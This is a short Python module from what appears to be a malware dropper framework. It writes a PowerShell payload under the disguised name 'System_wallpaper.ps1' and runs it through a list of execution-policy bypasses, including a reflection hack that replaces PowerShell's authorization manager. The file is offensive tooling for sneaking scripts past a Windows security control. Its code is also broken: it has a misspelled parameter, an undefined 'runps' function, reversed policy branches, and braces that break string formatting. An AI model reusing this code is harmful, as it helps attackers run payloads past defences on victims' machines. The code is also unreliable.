#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run powershell scripts (ps1) and bypass execution policy
#Start

def create_ps1(tobe):
	f = open("System_wallpaper.ps1","w")
	f.write(tobe)
	f.close()
	check_policy("System_wallpaper.ps1")

def check_policy(scipt):
	import os,subprocess
	command_output = os.popen('powershell -c "Get-ExecutionPolicy"').read()
	if command_output.lower()[:3] == "res": #restricted
		runps(script)
	else: #Unrestricted
		bypass_policy(script)

def bypass_policy(script):
	#Stolen from some where :V
	bypass_methods = [ 'Get-Content .\\{} | PowerShell.exe -noprofile - ',
	'TYPE .\\{} | PowerShell.exe -noprofile -',
	'Get-Content .\\{} | Invoke-Expression',
	'GC .\\{} | iex',
	'PowerShell.exe -ExecutionPolicy Bypass -File .\\{}',
	'''function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
Disable-ExecutionPolicy
.\\{}
	''']
	command = "powershell -c '''{}''' "
	for method in bypass_methods:
		try:
			x = subprocess.check_call( command.format( method.format( script ) ) )
		except subprocess.CalledProcessError:
			continue
		else:
			break

create_ps1(Ps1_Script_Data)
